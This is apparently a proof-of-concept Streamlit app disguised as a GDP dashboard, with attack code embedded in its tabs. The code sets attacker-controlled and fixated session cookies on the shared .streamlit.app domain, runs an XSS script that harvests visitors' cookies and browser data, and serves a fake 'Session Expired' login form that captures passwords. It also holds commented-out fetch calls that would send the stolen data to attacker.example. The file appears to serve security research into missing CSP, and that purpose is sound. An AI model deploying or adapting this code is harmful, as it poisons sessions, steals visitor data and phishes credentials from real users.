import streamlit as st

st.set_page_config(page_title='GDP Dashboard', page_icon=':earth_americas:')

# ══════════════════════════════════════════════════════════
# ATTACK 1: Cookie Tossing via st.html
# Set a cookie for .streamlit.app domain — this cookie gets
# sent to EVERY other Streamlit app on *.streamlit.app
# Can be used for: session fixation, CSRF, cache poisoning
# ══════════════════════════════════════════════════════════

# This JavaScript sets a cookie on the parent domain
cookie_toss_js = """
<script>
// Set a cookie for .streamlit.app — affects ALL apps on this domain
document.cookie = "poisoned=attacker_controlled_value; domain=.streamlit.app; path=/; SameSite=None; Secure";
document.cookie = "streamlit_session=ATTACKER_FIXATED_SESSION; domain=.streamlit.app; path=/; SameSite=None; Secure";

// Log what cookies we can read from this domain
var cookies = document.cookie;
document.getElementById('cookie-output').innerText = 'Cookies visible: ' + cookies;

// Exfiltrate cookies to attacker server (PoC — just logs to console)
console.log('COOKIE TOSS PoC: Set cookies for .streamlit.app domain');
console.log('All cookies:', document.cookie);
</script>
<div id="cookie-output" style="color:red;font-weight:bold;"></div>
<p>Cookie tossing PoC — check browser cookies. A cookie named "poisoned" should be set for .streamlit.app domain.</p>
"""

# ══════════════════════════════════════════════════════════
# ATTACK 2: XSS on visitors — steal visitor's data
# Since there's NO CSP on *.streamlit.app, any JS executes
# ══════════════════════════════════════════════════════════

xss_payload = """
<script>
// This runs on ANY visitor's browser — no CSP to block it
// PoC: Read the visitor's cookies and session data
var data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(Object.keys(localStorage)),
    url: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent
};

// In a real attack: exfiltrate to attacker server
// fetch('https://attacker.example/steal', {method:'POST', body:JSON.stringify(data)});

// For PoC: display what we captured
document.getElementById('xss-output').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
console.log('XSS PoC: Captured visitor data:', data);
</script>
<div id="xss-output" style="background:#fee;padding:10px;border:2px solid red;">
<b>XSS PoC — Visitor data will appear here</b>
</div>
"""

# ══════════════════════════════════════════════════════════
# ATTACK 3: Phishing via legitimate Streamlit app
# The app looks legitimate but serves a fake login form
# that steals credentials. No CSP = inline scripts work.
# ══════════════════════════════════════════════════════════

phishing_payload = """
<div style="background:white;padding:20px;border-radius:10px;max-width:400px;margin:20px auto;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
<h2 style="text-align:center;">Session Expired</h2>
<p>Your Streamlit Cloud session has expired. Please sign in again.</p>
<form id="phish-form">
<input type="email" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:5px;" id="phish-email">
<input type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:5px;" id="phish-pass">
<button type="submit" style="width:100%;padding:10px;background:#ff4b4b;color:white;border:none;border-radius:5px;cursor:pointer;">Sign In</button>
</form>
</div>
<script>
document.getElementById('phish-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var email = document.getElementById('phish-email').value;
    var pass = document.getElementById('phish-pass').value;
    // In real attack: send to attacker server
    // fetch('https://attacker.example/creds', {method:'POST', body:JSON.stringify({email,pass})});
    console.log('PHISHING PoC: Captured credentials:', email, pass);
    alert('PoC: Would send credentials to attacker. Email: ' + email);
});
</script>
"""

# ══════════════════════════════════════════════════════════
# Render the app — looks like a normal dashboard
# ══════════════════════════════════════════════════════════

st.title(":earth_americas: GDP Dashboard")
st.write("Browse GDP data from the World Bank.")

# The attacks are embedded in the page
tab1, tab2, tab3 = st.tabs(["Dashboard", "Settings", "Help"])

with tab1:
    st.write("Loading dashboard data...")
    # Cookie toss happens silently to every visitor
    st.html(cookie_toss_js, unsafe_allow_javascript=True)

with tab2:
    st.write("App configuration")
    # XSS captures visitor info
    st.html(xss_payload, unsafe_allow_javascript=True)

with tab3:
    # Phishing form
    st.html(phishing_payload, unsafe_allow_javascript=True)
